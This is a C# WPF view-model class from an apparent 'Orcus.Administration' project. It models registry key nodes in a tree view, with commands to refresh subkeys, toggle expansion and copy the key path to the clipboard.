using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows;
using Orcus.Administration.Commands.Registry;
using Orcus.Administration.Core.Annotations;
using Orcus.Administration.FileExplorer.Helpers;
using Orcus.Administration.FileExplorer.Models;
using Sorzus.Wpf.Toolkit;

namespace Orcus.Administration.ViewModels.CommandViewModels.Registry
{
    public class SubKeyNodeViewModel : ISupportTreeSelector<SubKeyNodeViewModel, AdvancedRegistrySubKey>,
        IEquatable<SubKeyNodeViewModel>, INotifyPropertyChanged, IIntoViewBringable
    {
        private readonly RegistryCommand _registryCommand;
        private readonly RegistryTreeViewModel _rootTreeViewModel;
        private RelayCommand _refreshSubItemsCommand;
        private RelayCommand _toogleIsExpandedCommand;
        private RelayCommand _copyKeyNameCommand;
        private bool _isBringIntoView;

        public SubKeyNodeViewModel(RegistryTreeViewModel rootTreeViewModel, AdvancedRegistrySubKey currentEntry,
            SubKeyNodeViewModel parentViewModel, RegistryCommand registryCommand)
        {
            _rootTreeViewModel = rootTreeViewModel;
            _registryCommand = registryCommand;
            Parent = parentViewModel;
            Value = currentEntry;
            IsRegistryHive = string.IsNullOrEmpty(Value.RelativePath);

            Entries = new EntriesHelper<SubKeyNodeViewModel>(LoadSubEntries);
            Selection = new TreeSelector<SubKeyNodeViewModel, AdvancedRegistrySubKey>(Value, this,
                parentViewModel == null ? rootTreeViewModel.Selection : parentViewModel.Selection, Entries);

            if (Value.IsEmpty)
                Entries.SetEntries(UpdateMode.Update);
        }

        public ObservableCollection<SubKeyNodeViewModel> AutoCompleteEntries => Entries.All;
        public AdvancedRegistrySubKey Value { get; }
        public SubKeyNodeViewModel Parent { get; }
        public bool IsRegistryHive { get; }

        public bool IsBringIntoView
        {
            get { return _isBringIntoView; }
            set
            {
                if (_isBringIntoView != value)
                {
                    _isBringIntoView = value;
                    OnPropertyChanged();
                }
            }
        }

        public RelayCommand ToogleIsExpandedCommand
        {
            get
            {
                return _toogleIsExpandedCommand ??
                       (_toogleIsExpandedCommand =
                           new RelayCommand(parameter => { Entries.IsExpanded = !Entries.IsExpanded; }));
            }
        }

        public RelayCommand RefreshSubItemsCommand
        {
            get
            {
                return _refreshSubItemsCommand ?? (_refreshSubItemsCommand = new RelayCommand(async parameter =>
                {
                    var entries = await LoadSubEntries(true);
                    Entries.SetEntries(UpdateMode.Replace, entries.ToArray());
                }));
            }
        }

        public RelayCommand CopyKeyNameCommand
        {
            get
            {
                return _copyKeyNameCommand ?? (_copyKeyNameCommand = new RelayCommand(parameter =>
                {
                    Clipboard.SetDataObject(Value.Path);
                }));
            }
        }

        public bool Equals(SubKeyNodeViewModel other)
        {
            return other?.Value.Path.Equals(Value.Path, StringComparison.OrdinalIgnoreCase) ?? false;
        }

        public event PropertyChangedEventHandler PropertyChanged;
        public IEntriesHelper<SubKeyNodeViewModel> Entries { get; set; }
        public ITreeSelector<SubKeyNodeViewModel, AdvancedRegistrySubKey> Selection { get; set; }

        private async Task<IEnumerable<SubKeyNodeViewModel>> LoadSubEntries(bool refresh = false)
        {
            return
                (await Task.Run(() => _registryCommand.GetRegistrySubKeys(Value, refresh))).Select(
                    x => new SubKeyNodeViewModel(_rootTreeViewModel, x, this, _registryCommand));
        }

        [NotifyPropertyChangedInvocator]
        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}